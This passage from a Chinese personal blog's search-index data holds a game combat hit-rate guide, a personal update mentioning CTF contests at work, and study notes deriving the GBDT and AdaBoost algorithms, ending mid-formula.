111) + 35 + 50 = 70%，提升还是很明显的 再进一步，我们意识到了战时敏捷才是最关键的于是我们给修尔克修得了直觉2[向强者挑战]的对强敌开战敏捷加成15%，并且链接上了莱茵努力2[针对强敌]的对强敌开战5%，丹邦洒脱2[极限看破]的半血15%以及力奇(隐藏)胆小2[很危险啊嗼]的半血20%。此时命中率：100-200+(196*1.55 - 111) + 35 + 50 = 177.8% woooo！！ 需要注意的是上面的命中率只是开场30秒的效果，当我们进入贤者模式后，命中率回到了100-200+(196*1.35 - 111) + 35 + 50 = 138.6%，而这也是在半血情况下的命中率，若没有这个战时敏捷倍率加持，命中率也就上面提到的70%。所以我们需要在开场30秒内做好整场战斗的规划。相反的，我们也可以推导出达到100%命中率下所需要的最低敏捷值：当修尔克性格具有自身的[向强者挑战]，并链接上[针对强敌]、[极限看破]和[很危险啊嗼]后，命中率为100-200+(面板敏捷值*1.55 - 111) + 35 + 50，要让命中率等于100%，很容易得出修尔克平时面板上的敏捷值应该等于145.8。但是考虑到很多玩家根本不会去做支线，也就不会有力奇的[很危险啊嗼]，所以下一章节中不会使用该性格，故修尔克战时敏捷加值倍率为15%+5%+15%=35%0x04 基础配置倒地流尝试，无隐藏性格、无5级以上宝石、无倒地延长宝石 装备、宝石首先修尔克装上2个夜间命中宝石达到50%夜间命中上升，几个敏捷宝石达到敏捷上升50，其余的可以装力量上升或者攻击力强化(原版实际最大自动攻击力等于最小自动攻击力+99，决定版中此bug?疑似被修复了)丹邦同样，装上2个夜间命中宝石，几个敏捷宝石，剩余的提升力量莱茵没多余的宝石了，就装了一个夜间命中，几个敏捷宝石，没事莱茵目前只是个工具人 性格修尔克选择直觉提升15敏捷性格链接如下：丹邦选择洒脱提升15敏捷(我还没完整的修完这条，所以是12)性格链接如下：莱茵选择努力提升15敏捷性格链接如下：我每个人人物本身的性格已经习得了不少了，但是你如果看完了上面的分析，也能理解到这些性格能力对挑战不会起到本质上的影响。由修尔克博爱5[友情的连锁]来引出连携成功率的计算方法：当修尔克-&amp;gt;丹邦-&amp;gt;莱茵传递完一轮之后，莱茵传递给修尔克的概率如上图所示，好感度满时可以加30%，莱茵链接了[友情的连锁]加15%概率，士气为普通时加20%，QTE就按照按不准来算，那么莱茵传递给修尔克的概率等于65%。 战技说战技之前首先补充说明团队槽的增长方法，团队槽一格是100，3格就是300。可以看出我们可以控制的是必杀也就是暴击加10，位置特效加20，所以我们技能一定要放准，有感叹号了再放。丹邦的战技如下，因为本章设计的配置太低了，所以需要尽可能的增加暴击率来实现尽快积攒团队槽，所以丹邦光环只带阳炎不带天下无双，带一个樱花绚烂防止修尔克开局被打死。莱茵战技如下，带上俯冲后踢来减敌人的敏捷 调整等级修尔克开局获得20%敏捷加成，并能通过战斗之魂强制进入半血可以再获得15%的敏捷加成，所以加成为35%。带入公式，100 - 200 + (x * 1.35 - 111) + 35 + 50 = 100，得出x = 167.4说明我们现在仍有余力，可以降低等级到40级，使敏捷刚好大于167.4丹邦虽然也有半血15%的敏捷加成，但是AI不稳定，所以按照开局稳定的20%计算100 - 200 + (x * 1.2 - 111) + 35 + 50 = 100，得出x = 188.3刚好也是等于40级修尔克负责破防，丹邦负责倒地，轮到莱茵的时候已经100%命中率了，所以莱茵小朋友直接1级 战斗开局打破防+减仇恨，调整位置看看能不能侧面打一个减物耐特效，见机不行就直接进连携，然后第一轮先打倒地(时间长)，配置不高就尽量按准QTE提高连携概率。具体看视频： [P1]0x05 稍高配置倒地流实际上不追求极限的话不会玩的那么紧张，上面不带倒地延长宝石还有点看脸，所以来试试稍微正常点的。 装备、宝石带上打猩猩获得的六级力量宝石，莱茵带上殖民地6四项复兴都达到3级时送的4级倒地宝石。 性格也不藏着掖着了，能力最大化，链接上夜间加力量和力奇的半血20%敏捷 战技让丹邦继续带上天下无双 调整等级因为修尔克战时敏捷修正55%了，100-200+(x*1.55 - 111) + 35 + 50 = 100，得出x=145.8，所以可以把修尔克调整到22级了 战斗具体看视频：P20x06 秒杀流1则倒地流打起来有点慢，只要掌握了命中率的奥秘，就可以在连携上随意发挥了，中期可以尝试用高连携下的樱花乱舞来实现秒杀。宝石没什么变化，性格丹邦连接上修尔克诚实5[连锁攻击的极致]，战技带上背水影技，可以实现3蓝传递，开局背水影技，进连携背水影技，樱花乱舞就必定续满。也不做详细描述了，由各位去自己探索乐趣。具体见视频： P30x07 秒杀流2则稍微做一个挑战主控丹邦时由于可以控半血，敏捷加成有55%，所以不带夜间命中宝石也可以，极限堆伤害等级也可以调到40此时战技命中率有100-200+(190*1.55-111)+35=118.5%，樱花乱舞命中率有108.5%。具体见视频： P406、07章节写的比较简洁，授人以鱼不如授人以渔，如果对本文的内容有了自己的理解和思考，这些都其实只不过是该游戏战斗系统实现的冰山一角罢了。" }, { "title": "碎碎念", "url": "/posts/%E7%A2%8E%E7%A2%8E%E5%BF%B5/", "categories": "随笔", "tags": "随笔", "date": "2021-12-18 22:59:00 +0800", "snippet": "距离上一次写博客还是在上次，18年8月秋招之后就再也没写过博客。。。今天开始这个博客重新开始经营了，记录一下19年、20年、21年都干了些啥19年忙于发论文，写毕设 Sihang Hu, Zhiying Tu, Zhongjie Wang, Xiaofei Xu. A POI-Sensitive Knowledge Graph based Service Recommendation Method. SCC 2019. (Accept) Haifang Wang, Zhongjie Wang, Sihang Hu, Xiaofei Xu, Shiping Chen, Zhiying Tu. DUSKG: A Fine-grained Knowledge Graph for Eﬀective Personalized Service Recommendations[J]. Future Generation Computer Systems, 2019, 100: 600-617. （Accept） 算是水了两篇。毕业后入职了杭州华为2012实验室某部门，从事安全方向，也主要是负责华为MindSpore框架的安全，以及一些业务。比较有意思的是19年10月参加了公司的CTF比赛，彼时我才知道有这样一个比赛。。。我们本科安全专业都在干啥。。。（回想起来，好像都在内卷，卷考试成绩。。）当然由于是第一次CTF比赛，所以是一脸懵逼，pwn没基础不会，reverse没实践不会，web没搞过不会，misc没脑洞不会，rw太难不会，也就crypto有点基础把初赛和半决赛的题做出来了。但是队伍整体实力偏弱，没有进决赛，没有体验到AWD，可惜可惜。当时也是决定要好好学学CTF，20年可以carry carry，买了两本书之后学习计划居然鸽了。。鸽了。于是20年10月的CTF比赛也是惨惨惨，由于没有半决赛，加上今年群魔乱舞，题目好难T^TDEFCON冠军队伍也参赛（奇点）确实nb啊我做了一个签到题，一个密码学。寄！没进决赛回顾完了，总之在安心打工搬砖，处理好工作上的事情。然后培养下兴趣爱好。之前确实工作之外的积累太少了，得改正得改正" }, { "title": "梯度提升树（GBDT）原理小结", "url": "/posts/%E6%A2%AF%E5%BA%A6%E6%8F%90%E5%8D%87%E6%A0%91-GBDT-%E5%8E%9F%E7%90%86%E5%B0%8F%E7%BB%93/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-18 19:02:54 +0800", "snippet": "本文就对Boosting家族中另一个重要的算法梯度提升树(Gradient Boosting Decison Tree, 以下简称GBDT)做一个总结。GBDT有很多简称，有GBT（Gradient Boosting Tree）, GTB（Gradient Tree Boosting ）， GBRT（Gradient Boosting Regression Tree）, MART(Multiple Additive Regression Tree)，其实都是指的同一种算法，本文统一简称GBDT。GBDT在BAT大厂中也有广泛的应用，假如要选择3个最重要的机器学习算法的话，个人认为GBDT应该占一席之地。1. GBDT概述GBDT也是集成学习Boosting家族的成员，但是却和传统的Adaboost有很大的不同。回顾下Adaboost，我们是利用前一轮迭代弱学习器的误差率来更新训练集的权重，这样一轮轮的迭代下去。GBDT也是迭代，使用了前向分布算法，但是弱学习器限定了只能使用CART回归树模型，同时迭代思路和Adaboost也有所不同。在GBDT的迭代中，假设我们前一轮迭代得到的强学习器是$f_{t-1}(x)$, 损失函数是$L(y, f_{t-1}(x))$, 我们本轮迭代的目标是找到一个CART回归树模型的弱学习器$h_t(x)$，让本轮的损失损失$L(y, f_{t}(x) =L(y, f_{t-1}(x)+ h_t(x))$最小。也就是说，本轮迭代找到决策树，要让样本的损失尽量变得更小。GBDT的思想可以用一个通俗的例子解释，假如有个人30岁，我们首先用20岁去拟合，发现损失有10岁，这时我们用6岁去拟合剩下的损失，发现差距还有4岁，第三轮我们用3岁拟合剩下的差距，差距就只有一岁了。如果我们的迭代轮数还没有完，可以继续迭代下面，每一轮迭代，拟合的岁数误差都会减小。从上面的例子看这个思想还是蛮简单的，但是有个问题是这个损失的拟合不好度量，损失函数各种各样，怎么找到一种通用的拟合方法呢？2. GBDT的负梯度拟合在上一节中，我们介绍了GBDT的基本思路，但是没有解决损失函数拟合方法的问题。针对这个问题，大牛Freidman提出了用损失函数的负梯度来拟合本轮损失的近似值，进而拟合一个CART回归树。第t轮的第i个样本的损失函数的负梯度表示为\\[r_{ti} = -\\bigg[\\frac{\\partial L(y_i, f(x_i)))}{\\partial f(x_i)}\\bigg]_{f(x) = f_{t-1}\\;\\; (x)}\\]利用$(x_i,r_{ti})\\;\\; (i=1,2,..m)$,我们可以拟合一颗CART回归树，得到了第t颗回归树，其对应的叶节点区域$R_{tj}, j =1,2,…, J$。其中$J$为叶子节点的个数。针对每一个叶子节点里的样本，我们求出使损失函数最小，也就是拟合叶子节点最好的的输出值$c_{tj}$如下：\\[c_{tj} = \\underbrace{arg\\; min}_{c}\\sum\\limits_{x_i \\in R_{tj}} L(y_i,f_{t-1}(x_i) +c)\\]这样我们就得到了本轮的决策树拟合函数如下：\\[h_t(x) = \\sum\\limits_{j=1}^{J}c_{tj}I(x \\in R_{tj})\\]从而本轮最终得到的强学习器的表达式如下：\\[f_{t}(x) = f_{t-1}(x) + \\sum\\limits_{j=1}^{J}c_{tj}I(x \\in R_{tj})\\]通过损失函数的负梯度来拟合，我们找到了一种通用的拟合损失误差的办法，这样无轮是分类问题还是回归问题，我们通过其损失函数的负梯度的拟合，就可以用GBDT来解决我们的分类回归问题。区别仅仅在于损失函数不同导致的负梯度不同而已。3. GBDT回归算法好了，有了上面的思路，下面我们总结下GBDT的回归算法。为什么没有加上分类算法一起？那是因为分类算法的输出是不连续的类别值，需要一些处理才能使用负梯度，我们在下一节讲。输入是训练集样本$T={(x_,y_1),(x_2,y_2), …(x_m,y_m)}$， 最大迭代次数T, 损失函数$L$。输出是强学习器$f(x)$1) 初始化弱学习器\\[f_0(x) = \\underbrace{arg\\; min}_{c}\\sum\\limits_{i=1}^{m}L(y_i, c)\\]2) 对迭代轮数$t=1,2,…T$有：​ a)对样本$i=1,2，…m$，计算负梯度\\[r_{ti} = -\\bigg[\\frac{\\partial L(y_i, f(x_i))}{\\partial f(x_i)}\\bigg]_{f(x) = f_{t-1}\\;\\; (x)}\\]​ b)利用$(x_i,r_{ti})\\;\\; (i=1,2,..m)$, 拟合一颗CART回归树,得到第t颗回归树，其对应的叶子节点区域为$R_{tj}, j =1,2,…, J$。其中$J$为回归树t的叶子节点的个数。​ c) 对叶子区域$j =1,2,..J$,计算最佳拟合值\\[c_{tj} = \\underbrace{arg\\; min}_{c}\\sum\\limits_{x_i \\in R_{tj}} L(y_i,f_{t-1}(x_i) +c)\\]​ d) 更新强学习器\\[f_{t}(x) = f_{t-1}(x) + \\sum\\limits_{j=1}^{J}c_{tj}I(x \\in R_{tj})\\]3) 得到强学习器$f(x)$的表达式\\[f(x) = f_T(x) =f_0(x) + \\sum\\limits_{t=1}^{T}\\sum\\limits_{j=1}^{J}c_{tj}I(x \\in R_{tj})\\]4. GBDT分类算法这里我们再看看GBDT分类算法，GBDT的分类算法从思想上和GBDT的回归算法没有区别，但是由于样本输出不是连续的值，而是离散的类别，导致我们无法直接从输出类别去拟合类别输出的误差。为了解决这个问题，主要有两个方法，一个是用指数损失函数，此时GBDT退化为Adaboost算法。另一种方法是用类似于逻辑回归的对数似然损失函数的方法。也就是说，我们用的是类别的预测概率值和真实概率值的差来拟合损失。本文仅讨论用对数似然损失函数的GBDT分类。而对于对数似然损失函数，我们又有二元分类和多元分类的区别。4.1 二元GBDT分类算法对于二元GBDT，如果用类似于逻辑回归的对数似然损失函数，则损失函数为：\\[L(y, f(x)) = log(1+ exp(-yf(x)))\\]其中$y \\in\\{-1, +1\\}$。则此时的负梯度误差为\\[r_{ti} = -\\bigg[\\frac{\\partial L(y, f(x_i))}{\\partial f(x_i)}\\bigg]_{f(x) = f_{t-1}\\;\\; (x)} = y_i/(1+exp(y_if(x_i)))\\]对于生成的决策树，我们各个叶子节点的最佳残差拟合值为\\[c_{tj} = \\underbrace{arg\\; min}_{c}\\sum\\limits_{x_i \\in R_{tj}} log(1+exp(-y_i(f_{t-1}(x_i) +c)))\\]由于上式比较难优化，我们一般使用近似值代替\\[c_{tj} = \\sum\\limits_{x_i \\in R_{tj}}r_{ti}\\bigg / \\sum\\limits_{x_i \\in R_{tj}}|r_{ti}|(1-|r_{ti}|)\\]除了负梯度计算和叶子节点的最佳残差拟合的线性搜索，二元GBDT分类和GBDT回归算法过程相同。4.2 多元GBDT分类算法多元GBDT要比二元GBDT复杂一些，对应的是多元逻辑回归和二元逻辑回归的复杂度差别。假设类别数为K，则此时我们的对数似然损失函数为：\\[L(y, f(x)) = - \\sum\\limits_{k=1}^{K}y_klog\\;p_k(x)\\]其中如果样本输出类别为$k$，则$y_k=1$。第$k$类的概率$p_k(x)$的表达式为：\\[p_k(x) = exp(f_k(x)) \\bigg / \\sum\\limits_{l=1}^{K} exp(f_l(x))\\]集合上两式，我们可以计算出第$t$轮的第$i$个样本对应类别$l$的负梯度误差为\\[r_{til} = -\\bigg[\\frac{\\partial L(y_i, f(x_i)))}{\\partial f(x_i)}\\bigg]_{f_k(x) = f_{l, t-1}\\;\\; (x)} = y_{il} - p_{l, t-1}(x_i)\\]观察上式可以看出，其实这里的误差就是样本i对应类别l的真实概率和$t-1$轮预测概率的差值。对于生成的决策树，我们各个叶子节点的最佳残差拟合值为\\[c_{tjl} = \\underbrace{arg\\; min}_{c_{jl}}\\sum\\limits_{i=0}^{m}\\sum\\limits_{k=1}^{K} L(y_k, f_{t-1, l}(x) + \\sum\\limits_{j=0}^{J}c_{jl} I(x_i \\in R_{tj}))\\]由于上式比较难优化，我们一般使用近似值代替\\[c_{tjl} = \\frac{K-1}{K} \\; \\frac{\\sum\\limits_{x_i \\in R_{tjl}}r_{til}}{\\sum\\limits_{x_i \\in R_{til}}|r_{til}|(1-|r_{til}|)}\\]除了负梯度计算和叶子节点的最佳残差拟合的线性搜索，多元GBDT分类和二元GBDT分类以及GBDT回归算法过程相同。5. GBDT常用损失函数这里我们再对常用的GBDT损失函数做一个总结。 对于分类算法，其损失函数一般有对数损失函数和指数损失函数两种:a) 如果是指数损失函数，则损失函数表达式为\\[L(y, f(x)) = exp(-yf(x))\\]其负梯度计算和叶子节点的最佳残差拟合参见Adaboost原理篇。b) 如果是对数损失函数，分为二元分类和多元分类两种，参见4.1节和4.2节。 对于回归算法，常用损失函数有如下4种:a)均方差，这个是最常见的回归损失函数了\\[L(y, f(x)) =(y-f(x))^2\\]b)绝对损失，这个损失函数也很常见\\[L(y, f(x)) =|y-f(x)|\\]对应负梯度误差为：\\[sign(y_i-f(x_i))\\]c)Huber损失，它是均方差和绝对损失的折衷产物，对于远离中心的异常点，采用绝对损失，而中心附近的点采用均方差。这个界限一般用分位数点度量。损失函数如下：\\[L(y, f(x))= \\begin{cases} \\frac{1}{2}(y-f(x))^2&amp;amp; {|y-f(x)| \\leq \\delta}\\\\ \\delta(|y-f(x)| - \\frac{\\delta}{2})&amp;amp; {|y-f(x)| &amp;gt; \\delta} \\end{cases}\\]对应的负梯度误差为：\\[r(y_i, f(x_i))= \\begin{cases} y_i-f(x_i)&amp;amp; {|y_i-f(x_i)| \\leq \\delta}\\\\ \\delta sign(y_i-f(x_i))&amp;amp; {|y_i-f(x_i)| &amp;gt; \\delta} \\end{cases}\\]d) 分位数损失。它对应的是分位数回归的损失函数，表达式为\\[L(y, f(x)) =\\sum\\limits_{y \\geq f(x)}\\theta|y - f(x)| + \\sum\\limits_{y &amp;lt; f(x)}(1-\\theta)|y - f(x)|\\]其中$\\theta$为分位数，需要我们在回归前指定。对应的负梯度误差为：\\[r(y_i, f(x_i))= \\begin{cases} \\theta&amp;amp; { y_i \\geq f(x_i)}\\\\ \\theta - 1 &amp;amp; {y_i &amp;lt; f(x_i) } \\end{cases}\\]对于Huber损失和分位数损失，主要用于健壮回归，也就是减少异常点对损失函数的影响。6. GBDT的正则化和Adaboost一样，我们也需要对GBDT进行正则化，防止过拟合。GBDT的正则化主要有三种方式。第一种是和Adaboost类似的正则化项，即步长(learning rate)。定义为$\\nu$,对于前面的弱学习器的迭代\\[f_{k}(x) = f_{k-1}(x) + h_k(x)\\]如果我们加上了正则化项，则有\\[f_{k}(x) = f_{k-1}(x) + \\nu h_k(x)\\]$\\nu$的取值范围为$0 &amp;lt; \\nu \\leq 1$。对于同样的训练集学习效果，较小的$\\nu$意味着我们需要更多的弱学习器的迭代次数。通常我们用步长和迭代最大次数一起来决定算法的拟合效果。第二种正则化的方式是通过子采样比例（subsample）。取值为$(0,1]$。注意这里的子采样和随机森林不一样，随机森林使用的是放回抽样，而这里是不放回抽样。如果取值为1，则全部样本都使用，等于没有使用子采样。如果取值小于1，则只有一部分样本会去做GBDT的决策树拟合。选择小于1的比例可以减少方差，即防止过拟合，但是会增加样本拟合的偏差，因此取值不能太低。推荐在$[0.5, 0.8]$之间。使用了子采样的GBDT有时也称作随机梯度提升树(Stochastic Gradient Boosting Tree, SGBT)。由于使用了子采样，程序可以通过采样分发到不同的任务去做boosting的迭代过程，最后形成新树，从而减少弱学习器难以并行学习的弱点。第三种是对于弱学习器即CART回归树进行正则化剪枝。在决策树原理篇里我们已经讲过，这里就不重复了。7. GBDT小结GBDT终于讲完了，GDBT本身并不复杂，不过要吃透的话需要对集成学习的原理，决策树原理和各种损失函树有一定的了解。由于GBDT的卓越性能，只要是研究机器学习都应该掌握这个算法，包括背后的原理和应用调参方法。目前GBDT的算法比较好的库是xgboost。当然scikit-learn也可以。最后总结下GBDT的优缺点。GBDT主要的优点有： 可以灵活处理各种类型的数据，包括连续值和离散值。 在相对少的调参时间情况下，预测的准备率也可以比较高。这个是相对SVM来说的。 使用一些健壮的损失函数，对异常值的鲁棒性非常强。比如 Huber损失函数和Quantile损失函数。GBDT的主要缺点有： 由于弱学习器之间存在依赖关系，难以并行训练数据。不过可以通过自采样的SGBT来达到部分并行。参考文献：https://www.cnblogs.com/pinard/p/6140514.html" }, { "title": "集成学习之AdaBoost算法原理小结", "url": "/posts/%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0%E4%B9%8BAdaboost%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E5%B0%8F%E7%BB%93/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-17 19:02:54 +0800", "snippet": "在集成学习原理小结中，我们讲到了集成学习按照个体学习器之间是否存在依赖关系可以分为两类，第一个是个体学习器之间存在强依赖关系，另一类是个体学习器之间不存在强依赖关系。前者的代表算法就是是boosting系列算法。在boosting系列算法中， AdaBoost是最著名的算法之一。AdaBoost既可以用作分类，也可以用作回归。本文就对AdaBoost算法做一个总结。1. 回归boosting算法的基本原理从图中可以看出，Boosting算法的工作机制是首先从训练集用初始权重训练出一个弱学习器1，根据弱学习的学习误差率表现来更新训练样本的权重，使得之前弱学习器1学习误差率高的训练样本点的权重变高，使得这些误差率高的点在后面的弱学习器2中得到更多的重视。然后基于调整权重后的训练集来训练弱学习器2.，如此重复进行，直到弱学习器数达到事先指定的数目T，最终将这T个弱学习器通过集合策略进行整合，得到最终的强学习器。　　不过有几个具体的问题Boosting算法没有详细说明。 如何计算学习误差率e? 如何得到弱学习器权重系数$\\alpha$? 如何更新样本权重$D$? 使用何种结合策略？只要是boosting大家族的算法，都要解决这4个问题。那么AdaBoost是怎么解决的呢？2. AdaBoost算法的基本思路我们这里讲解AdaBoost是如何解决上一节这4个问题的。假设我们的训练集样本是\\[T=\\{(x_,y_1),(x_2,y_2), ...(x_m,y_m)\\}\\]训练集的在第k个弱学习器的输出权重为\\[D(k) = (w_{k1}, w_{k2}, ...w_{km}) ;\\;\\; w_{1i}=\\frac{1}{m};\\;\\; i =1,2...m\\]首先我们看看AdaBoost的分类问题 针对第一个问题，如何计算学习误差率e?分类问题的误差率很好理解和计算。由于多元分类是二元分类的推广，这里假设我们是二元分类问题，输出为${-1，1}$，则第k个弱分类器$G_k(x)$在训练集上的加权误差率为\\[e_k = P(G_k(x_i) \\neq y_i) = \\sum\\limits_{i=1}^{m}w_{ki}I(G_k(x_i) \\neq y_i)\\] 针对第二个问题，如何得到弱学习器权重系数$\\alpha$?接着我们看弱学习器权重系数,对于二元分类问题，第k个弱分类器$G_k(x)$的权重系数为\\[\\alpha_k = \\frac{1}{2}log\\frac{1-e_k}{e_k}\\]为什么这样计算弱学习器权重系数？从上式可以看出，如果分类误差率$e_k$越大，则对应的弱分类器权重系数$\\alpha_k$越小（$e_k$还是要小于1/2的）。也就是说，误差率小的弱分类器权重系数越大。具体为什么采用这个权重系数公式，我们在讲AdaBoost的损失函数优化时再讲。 针对第三个问题，如何更新样本权重$D$?假设第$k$个弱分类器的样本集权重系数为$D(k) = (w_{k1}, w_{k2}, …w_{km})$，则对应的第$k+1$个弱分类器的样本集权重系数为\\[w_{k+1,i} = \\frac{w_{ki}}{Z_K}exp(-\\alpha_ky_iG_k(x_i))\\]这里$Z_k$是规范化因子（使得$D_{k+1}$满足概率分布，即$\\sum\\limits_{i=1}^{m}m_{k+1},i=1$）\\[Z_k = \\sum\\limits_{i=1}^{m}w_{ki}exp(-\\alpha_ky_iG_k(x_i))\\]从$w_{k+1,i}$计算公式可以看出，如果第i个样本分类错误，则$y_iG_k(x_i) &amp;lt; 0$，导致样本的权重在第k+1个弱分类器中增大，如果分类正确，则权重在第k+1个弱分类器中减少.具体为什么采用样本权重更新公式，我们在讲AdaBoost的损失函数优化时再讲。 针对第四个问题，使用何种结合策略？AdaBoost分类采用的是加权平均法，最终的强分类器为\\[f(x) = sign(\\sum\\limits_{k=1}^{K}\\alpha_kG_k(x))\\]接着我们看看AdaBoost的回归问题。由于AdaBoost的回归问题有很多变种，这里我们以AdaBoost R2算法为准。我们先看看回归问题的误差率的问题，对于第k个弱学习器，计算他在训练集上的最大误差\\[E_k= max|y_i - G_k(x_i)|\\;i=1,2...m\\]然后计算每个样本的相对误差\\[e_{ki}= \\frac{|y_i - G_k(x_i)|}{E_k}\\]这里是误差损失为线性时的情况，如果我们用平方误差，则$e_{ki}= \\frac{(y_i - G_k(x_i))^2}{E_k^2}$,如果我们用的是指数误差，则$e_{ki}= 1 - exp（\\frac{-y_i + G_k(x_i))}{E_k}）$最终得到第k个弱学习器的误差率\\[e_k = \\sum\\limits_{i=1}^{m}w_{ki}e_{ki}\\]我们再来看看如何得到弱学习器权重系数$\\alpha$。这里有：\\[\\alpha_k =\\frac{e_k}{1-e_k}\\]对于更新更新样本权重$D$，第$k+1$个弱学习器的样本集权重系数为\\[w_{k+1,i} = \\frac{w_{ki}}{Z_k}\\alpha_k^{1-e_{ki}}\\]这里$Z_k$是规范化因子\\[Z_k = \\sum\\limits_{i=1}^{m}w_{ki}\\alpha_k^{1-e_{ki}}\\]最后是结合策略，和分类问题稍有不同，采用的是对加权的弱学习器取中位数的方法，最终的强回归器为\\[f(x) = \\sum\\limits_{k=1}^{K}(ln\\frac{1}{\\alpha_k})g(x)\\]其中，$g(x)$是所有$\\alpha_kG_k(x), k=1,2,….K$的中位数。　3. AdaBoost分类问题的损失函数优化刚才上一节我们讲到了分类Adaboost的弱学习器权重系数公式和样本权重更新公式。但是没有解释选择这个公式的原因，让人觉得是魔法公式一样。其实它可以从Adaboost的损失函数推导出来。从另一个角度讲，Adaboost是模型为加法模型，学习算法为前向分步学习算法，损失函数为指数函数的分类问题。模型为加法模型好理解，我们的最终的强分类器是若干个弱分类器加权平均而得到的。前向分步学习算法也好理解，我们的算法是通过一轮轮的弱学习器学习，利用前一个弱学习器的结果来更新后一个弱学习器的训练集权重。也就是说，第$k-1$轮的强学习器为\\[f_{k-1}(x) = \\sum\\limits_{i=1}^{k-1}\\alpha_iG_{i}(x)\\]而第$k$轮的强学习器为\\[f_{k}(x) = \\sum\\limits_{i=1}^{k}\\alpha_iG_{i}(x)\\]上两式一比较可以得到\\[f_{k}(x) = f_{k-1}(x) + \\alpha_kG_k(x)\\]可见强学习器的确是通过前向分步学习算法一步步而得到的。AdaBoost损失函数为指数函数，即定义损失函数为\\[\\underbrace{arg\\;min\\;}_{\\alpha, G} \\sum\\limits_{i=1}^{m}exp(-y_if_{k}(x))\\]利用前向分步学习算法的关系可以得到损失函数为\\[(\\alpha_k, G_k(x)) = \\underbrace{arg\\;min\\;}_{\\alpha, G}\\sum\\limits_{i=1}^{m}exp[(-y_i) (f_{k-1}(x) + \\alpha G(x))]\\]令$w_{ki}^{’} = exp(-y_if_{k-1}(x))$, 它的值不依赖于$\\alpha$, $G$,因此与最小化无关，仅仅依赖于$f_{k-1}(x)$,随着每一轮迭代而改变。将这个式子带入损失函数,损失函数转化为\\[(\\alpha_k, G_k(x)) = \\underbrace{arg\\;min\\;}_{\\alpha, G}\\sum\\limits_{i=1}^{m}w_{ki}^{’}exp[-y_i\\alpha G(x)]\\]首先，我们求$G_k(x)$，可以得到\\[G_k(x) = \\underbrace{arg\\;min\\;}_{G}\\sum\\limits_{i=1}^{m}w_{ki}^{’}I(y_i \\neq G(x_i))\\]将$G_k(x)$带入损失函数\\[\\sum\\limits_{i=1}^{k}w_{ki}^{&#39;}exp(-y_i\\alpha G(x_i)) \\\\ =\\sum\\limits_{y_i=G_k(x_i)}w_{ki}^{&#39;}e^{-\\alpha}+\\sum\\limits_{y_i\\neq G_m(x_i)}w_{ki}^{&#39;}e^{\\alpha} \\\\=(e^{\\alpha} - e^{- \\alpha})\\sum\\limits_{i=1}^{m}w_{ki}^{&#39;}I(G(x_i) \\neq y_i) + e^{-\\alpha}\\sum\\limits_{i=1}^{k}w_{ki}^{&#39;}\\]并对$\\alpha$求导，使其等于0，则就得到了\\[\\alpha_k = \\frac{1}{2}log\\frac{1-e_k}{e_k}\\] 过程： 先求导等于0，得到：\\[(e^{\\alpha }+ e^{- \\alpha})\\sum\\limits_{i=1}^{m}w_{ki}^{&#39;}I(G(x_i) \\neq y_i) - e^{-\\alpha}\\sum\\limits_{i=1}^{k}w_{ki}^{&#39;}=0\\] 注意到：\\(e_k = \\frac{\\sum\\limits_{i=1}^{m}w_{ki}^{’}I(y_i \\neq G(x_i))}{\\sum\\limits_{i=1}^{m}w_{ki}^{’}} = \\sum\\limits_{i=1}^{m}w_{ki}I(y_i \\neq G(x_i))\\) 将$e_k$带入上面导数等于0的式子，我们得到：\\[(e^{\\alpha} + e^{-\\alpha})e_k - e^{-\\alpha} = 0\\] 求解该式子，我们就可以得到$\\alpha$的最优解$\\alpha_k$其中，$e_k$即为我们前面的分类误差率。\\[e_k = \\frac{\\sum\\limits_{i=1}^{m}w_{ki}^{’}I(y_i \\neq G(x_i))}{\\sum\\limits_{i=1}^{m}w_{ki}^{’}} = \\sum\\limits_{i=1}^{m}w_{ki}I(y_i \\neq G(x_i))\\]最后看样本权重的更新。利用$f_{k}(x) = f_{k-1}(x) + \\alpha_kG_k(x)$和$w_{ki}^{’} = exp(-y_if_{k-1}(x))$，即可得：\\[w_{k+1,i}^{’} = w_{ki}^{’}exp[-y_i\\alpha_kG_k(x)]\\]这样就得到了我们第二节的样本权重更新公式。4. AdaBoost二元分类问题算法流程这里我们对AdaBoost二元分类问题算法流程做一个总结。输入为样本集$T=\\{(x_1,y_1),(x_2,y_2), …(x_m,y_m)\\}$，输出为$\\{ -1, +1 \\}$，弱分类器算法, 弱分类器迭代次数K。输出为最终的强分类器$f(x)$1) 初始化样本集权重为\\[D(1) = (w_{11}, w_{12}, ...w_{1m}) ;\\;\\; w_{1i}=\\frac{1}{m};\\;\\; i =1,2...m\\]2) 对于$k=1,2，…K$:​ a) 使用具有权重$D_k$的样本集来训练数据，得到弱分类器$G_k(x)$，（设定一个阈值，使得在权值分布的数据集上，分类误差率最低）​ b)计算$G_k(x)$的分类误差率\\[e_k = P(G_k(x_i) \\neq y_i) = \\sum\\limits_{i=1}^{m}w_{ki}I(G_k(x_i) \\neq y_i)\\]​ c) 计算弱分类器的系数\\[\\alpha_k = \\frac{1}{2}log\\frac{1-e_k}{e_k}\\]​ d) 更新样本集的权重分布\\[w_{k+1,i} = \\frac{w_{ki}}{Z_K}exp(-\\alpha_ky_iG_k(x_i)) \\;\\; i =1,2,...m\\]​ 这里$Z_k$是规范化因子\\[Z_k = \\sum\\limits_{i=1}^{m}w_{ki}exp(-\\alpha_ky_iG_k(x_i))\\]3) 构建最终分类器为：\\[f(x) = sign(\\sum\\limits_{k=1}^{K}\\alpha_kG_k(x))\\]对于Adaboost多元分类算法，其实原理和二元分类类似，最主要区别在弱分类器的系数上。比如Adaboost SAMME算法，它的弱分类器的系数\\[\\alpha_k = \\frac{1}{2}log\\frac{1-e_k}{e_k} + log(R-1)\\]其中$R$为类别数。从上式可以看出，如果是二元分类，$R=2$，则上式和我们的二元分类算法中的弱分类器的系数一致。5. AdaBoost回归问题的算法流程这里我们对AdaBoost回归问题算法流程做一个总结。AdaBoost回归算法变种很多，下面的算法为Adaboost R2回归算法过程。输入为样本集$T=\\{(x_1,y_1),(x_2,y_2), …(x_m,y_m)\\}$，弱学习器算法, 弱学习器迭代次数$K$。输出为最终的强学习器$f(x)$1) 初始化样本集权重为\\[D(1) = (w_{11}, w_{12}, ...w_{1m}) ;\\;\\; w_{1i}=\\frac{1}{m};\\;\\; i =1,2...m\\]2) 对于$k=1,2，…K$:​ a) 使用具有权重$D_k$的样本集来训练数据，得到弱学习器$G_k(x)$​ b) 计算训练集上的最大误差\\[E_k= 